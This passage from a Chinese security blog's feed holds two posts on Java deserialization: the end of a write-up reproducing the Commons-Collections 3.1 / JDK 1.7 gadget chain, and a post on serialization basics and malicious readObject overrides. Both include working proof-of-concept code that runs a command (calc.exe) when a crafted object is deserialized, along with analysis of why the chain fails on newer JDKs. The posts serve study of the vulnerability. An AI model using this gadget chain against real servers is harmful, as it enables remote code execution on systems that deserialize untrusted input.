class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">    Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">    Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化</span></span><br><span class="line">    fin.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>成功<br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78b0itdcgj3231129wki.jpg" alt="end.png"></p><p>至此，我们在客户端构造了payload发送至服务端，<br>只要服务端</p><ol><li>对我们的输入进行反序列化</li><li>jdk版本为1.7</li></ol><p>就可以直接完成命令执行，完美！</p><h4 id="2020-07-09更新"><a href="#2020-07-09更新" class="headerlink" title="2020/07/09更新"></a>2020/07/09更新</h4><p>完美个屁，在先知有同学提出了问题：</p><blockquote><p>请问为什么<code>innerMap.put(&quot;value&quot;, &quot;value&quot;);</code>我换成<code>innerMap.put(&quot;key&quot;, &quot;value&quot;);</code>就无法触发，key换成其他值都无法触发，只有“value”可以。</p></blockquote><p>这其实就是当初一个人茫然的学学学，实在坚持不下去，疏忽导致的坑。那么我们回过头来看这个问题。</p><p>在我们封装成Map时。就默认使用了<code>value:value</code>作为键值对，在那个时候我们把这里改成任意的键值对都是可以成功触发的。</p><p>但是一旦我们引入了AnnotationInvocationHandler作为readobject复写点，就再去改动这个值就会执行命令失败。问题肯定处理在AnnotaionInvocationHandler这个过程中。</p><p>来DEBUG看当取值<code>key:value</code>时，在什么地方出了问题，找到是反序列化时的<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>,这边var7，会为空，从而不进入我们的setValue触发命令执行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1ggkne1rlpxj31oh10j0xk.jpg" alt="20200709-1.png"></p><p>来看为什么，重新分析之前囫囵吞枣地AnnotationInvocationHandler的readobject：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//默认反序列化,这里是前半部分代码</span></span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//这里的this.type是我们在实例化的时候传入的jdk自带的Target.class</span></span><br><span class="line">            <span class="comment">//之前的poc语句是这样Object instance = ctor.newInstance(Target.class, outerMap);</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>AnnotationType.getInstance(this.type)</code>是一个关键的有关注解的操作。所以我们需要先来了解一下java的注解。</p><h5 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h5><p><code>Target.class</code>其实是java提供的的<strong>元注解</strong>（因为是注解所以之后写成特有的形式<code>@Target</code>）。除此之外还有<code>@Retention</code>、<code>@Documented</code>、<code>@Inherited</code>，所谓元注解就是标记其他注解的注解。</p><ul><li>@Target 用来约束注解可以应用的地方（如方法、类或字段）</li><li>@Retention用来约束注解的生命周期，分别有三个值，源码级别（source），类文件级别（class）或者运行时级别（runtime)</li><li>@Documented  被修饰的注解会生成到javadoc中</li><li>@Inherited 可以让注解被继承，但这并不是真的继承，只是通过使用@Inherited，可以让子类Class对象使用getAnnotations()获取父类被@Inherited修饰的注解</li><li>除此之外注解还可以有注解元素(等同于赋值)。</li></ul><p>举个自定义注解的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> DBTable &#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;<span class="comment">//default是默认值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会被这样使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DBTable</span>(name = <span class="string">"MEMBER"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Member</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于赋值的时候总是用 <code>注解元素 = 值</code>的形式太麻烦了，出现了 <code>value</code> 这个偷懒的语法糖。（这也是为什么之前的<code>@Target(ElementType.TYPE)</code>不是<code>注解元素 = 值</code>的形式）</p><p>如果注解元素为<strong>value</strong>时，就不需要用<code>注解元素 = 值</code>的形式，而是直接写入值就可以赋值为value。</p><p>除此之外java还有一些内置注解：</p><ul><li>@Override：用于标明此方法覆盖了父类的方法</li><li>@Deprecated：用于标明已经过时的方法或类</li><li>@SuppressWarnnings:用于有选择的关闭编译器对类、方法、成员变量、变量初始化的警告</li></ul><p>回过头来看看<code>java.lang.annotation.Target</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span><span class="comment">//会被写入javadoc文档</span></span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)<span class="comment">//生命周期时运行时</span></span><br><span class="line"><span class="meta">@Target</span>(ElementType.ANNOTATION_TYPE)<span class="comment">//标明注解可以用于注解声明(应用于另一个注解上)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    ElementType[] value();<span class="comment">//注解元素，一个特定的value语法糖，可以省点力气</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="回来"><a href="#回来" class="headerlink" title="回来"></a>回来</h5><p>初步了解了java的注解之后，我们回来看<code>AnnotationType.getInstance(this.type)</code>对@Target这个注解的处理，不过多的去纠结内部细节，getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1ggknef1yx6j31ej09mdh6.jpg" alt="20200709-2.png"></p><p>再来看接下来的var3，var3就是一个注解元素的键值对<code>value这个注解元素，可以取值Ljava.lang.annotation.ElementType类型的值</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//后半部分代码</span></span><br><span class="line">        Map var3 = var2.memberTypes();<span class="comment">//&#123;value：ElementType的键值对&#125;</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">    <span class="comment">//获取我们构造map的迭代器，无法命令执行的键值对是&#123;key:value&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();<span class="comment">//获取到&#123;key:value&#125;</span></span><br><span class="line">            String var6 = (String)var5.getKey();<span class="comment">//获取键值对的键名key</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="comment">//从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值</span></span><br><span class="line">            <span class="comment">//于是var7为空</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//触发命令执行处</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就搞懂了为什么赋值map{key：value}就不行，因为通过AnnotationInvocationHandler#readObject，我们需要保证：</p><ul><li>我们poc中提供的<code>this.type</code>的注解要存在注解元素名（为了满足var3不为空）。</li><li>我们poc中提供的<code>this.memberValues</code>中存在的一个键值对的键名与<code>this.type</code>的注解要存在注解元素名相等。（为了满足var7!=null）</li></ul><p>所以我们选取了@Target注解作为<code>this.type</code>，我们就必须向<code>this.memberValues</code>写入一个<code>value：xxx</code>的键值对</p><p>这里的<code>this.type</code>是可以变动的，比如换成另一个元注释<code>Retention.class</code>（虽然他的注解元素名也是value），甚至可以自定义，但是对方服务器上没有这个注释，打别人是没有用的，所以还是选用大家都有的元注释。</p><p>同时我们写入的<code>this.memberValues</code>的键名不能改变，但是值可以改变。</p><p>比如：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1ggknep0yxaj31eg0ojtg0.jpg" alt="20200709-3.png"></p><p>现在完美</p><h4 id="jdk1-8为什么不行呢"><a href="#jdk1-8为什么不行呢" class="headerlink" title="jdk1.8为什么不行呢"></a>jdk1.8为什么不行呢</h4><p>其实上面的poc在Java 7的低版本（只测试了7u80，没有具体版本号）、8u71之前都是可以使用的，在Java 8u71之后代码发生了变动。</p><p>那么为啥不行呢,看一下jdk8里面的<code>sun.reflect.annotation.AnnotationInvocationHandler</code> readObject复写点：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        Map var4 = (Map)var2.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = <span class="keyword">null</span>;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//很伤心的，没有了map赋值语句</span></span><br><span class="line">                    var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">"["</span> + var11 + <span class="string">"]"</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略不重要...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为这个函数出现了变动，不再有针对我们构造的map的赋值语句，所以触发不了漏洞。</p><p>而是改成了新建一个LinkedHashMap，把值转进这个LinkedHashMap里面。</p><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>至此我们就完成common-collection 3.1版本 jdk1.7版本下的POC复现和利用链分析。<br>当然还有common-collection 不同组件版本，不同环境下poc和利用链均有不同，在ysoserial下就有7，8中利用方式。<br>还可以通过rmi模式进行利用等。</p><p>但是由于这篇博客写的太长了，思路也一直断断续续，其他内容之后再陆续学习分析吧~</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>参考资料大多从先知中获取，这里就列举一部分。<br><a href="https://xz.aliyun.com/t/4711#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711#toc-3</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://mp.weixin.qq.com/s/gZbcdS0TbAetZwVMyjkGWQ" target="_blank" rel="noopener">玩转ysoserial-CommonsCollection的七种利用方式分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在此文中着重一点点复现推导了commons-collections、jdk1.7的poc的构造，记录了踩得一个个坑。&lt;br&gt;需要结合反射机制一文食用。&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-基础</title>
    <link href="http://lalajun.com/2019/08/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%9F%BA%E7%A1%80/"/>
    <id>http://lalajun.com/2019/08/20/java反序列化-基础/</id>
    <published>2019-08-20T06:58:45.000Z</published>
    <updated>2019-10-14T03:11:44.654Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要分成四部分</p><ul><li>java序列化与反序列化的正常使用</li><li>java反序列化readObject是如何构成漏洞的</li><li>java反序列化的服务器环境中是否需要序列化的类的定义，才能触发反序列化漏洞？</li><li>为何readObject复写是需要使用private属性并且传参java.io.ObjectInputStream这个特定的格式？</li></ul><p>首先从使用java反序列化开始</p><h2 id="序列化与反序列化的正常使用"><a href="#序列化与反序列化的正常使用" class="headerlink" title="序列化与反序列化的正常使用"></a>序列化与反序列化的正常使用</h2><p>先来看代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.attribute.UserDefinedFileAttributeView;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">trytry</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//整一个需要序列化的对象</span></span><br><span class="line">        user u = <span class="keyword">new</span> user();</span><br><span class="line">        u.setName(<span class="string">"lala"</span>);</span><br><span class="line">        <span class="comment">//序列化输出至屏幕</span></span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(System.out);</span><br><span class="line">        out.writeObject(u);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//序列化写入文件</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"test.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(u);</span><br><span class="line">        <span class="comment">//序列化写入到变量中</span></span><br><span class="line">        ByteArrayOutputStream bOut = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(bOut);</span><br><span class="line">        objOut.writeObject(u);</span><br><span class="line">        <span class="keyword">byte</span>[] str= bOut.toByteArray();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(str));</span><br><span class="line">        <span class="comment">//从变量中反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(str));</span><br><span class="line">        user u_d = (user) ois.readObject();</span><br><span class="line">        System.out.println(u_d.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行结果如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">�� sr user_AO���j L namet Ljava/lang/String;xpt lala</span><br><span class="line">�� sr user_AO���j L namet Ljava/lang/String;xpt lala</span><br><span class="line">lala</span><br></pre></td></tr></table></figure><p>一个类的对象想要序列化成功，需要满足一个条件：</p><ol><li>该类必须实现java.io.Serializable或Externalizable接口</li></ol><p>同时类中不是全部内容都是可以序列化的，还有不能被序列化的情况：</p><ol><li>如果该类有父类，则分两种情况来考虑：<ul><li>如果该父类已经实现了可序列化接口，则其父类的相应字段及属性的处理和该类相同；</li><li>如果该类的父类没有实现可序列化接口，则该类的父类所有的字段属性将不会序列化，并且反序列化时会调用父类的默认构造函数来初始化父类的属性，而子类却不调用默认构造函数，而是直接从流中恢复属性的值。</li></ul></li><li>如果该类的某个属性标识为static类型的，则该属性不能序列化。</li><li>如果该类的某个属性采用transient关键字标识，则该属性不能序列化。</li></ol><p>如果你想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 java.io.Serializable接口。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞关键在于调用<code>readObject()</code>,截取以上代码的关键漏洞代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(str))</span><br><span class="line">user u_d = (user) ois.readObject();</span><br></pre></td></tr></table></figure></p><p>那我们试着用网上的payload来复写readObject，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改以上user类执行，会弹出计算器。可见执行的readObject是我们写入的readObject。</p><h3 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h3><p>那么先来回顾以下，我们以上的代码做了以下事情：</p><ol><li>自己写了一个可覆盖readObject函数的user类</li><li>创建了一个user类的实例</li><li>对之进行序列化，并存入str（这就是我们的payload）</li><li>再从str中反序列化恢复成user类，并输出了user类中的name</li></ol><p>那么问题来了，<strong>在反序列化的时候，是不是一定要代码中定义了user这个类才会执行我们的payload中的恶意readObject函数呢</strong>？<br>因为实际上服务器一般不可能存在一个我们用于复写恶意代码的类，如果必须存在user这个可复写的恶意类，我们的攻击通常不会起作用。</p><h4 id="那么试验下"><a href="#那么试验下" class="headerlink" title="那么试验下"></a>那么试验下</h4><p>我们做以下实验：</p><ol><li>用之前的代码写入paylaod到一个文件</li><li>在另一个没有user这个类的main函数中中直接读取这个文件内容并进行反序列化。</li><li>全部注释原来java文件中的user这个类（重要）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test_user_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//序列化写入文件</span></span><br><span class="line">        FileInputStream f = <span class="keyword">new</span> FileInputStream(<span class="string">"test.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(f);</span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pw7duosj310k147tcf.jpg" alt><br>执行代码发生报错：找不到user这个类</p><ol start="4"><li>注释user类的所有接口，只留下user这个类的空壳</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pvzrlthj325d0v3tbu.jpg" alt><br>class接口错误</p><ol start="5"><li>只注释user类中的复写readObject函数</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pvqi8arj30y60o5ab9.jpg" alt><br>未报错，但是未执行calc.exe</p><ol start="6"><li>不注释user类</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pv2xhd7j30xz16otff.jpg" 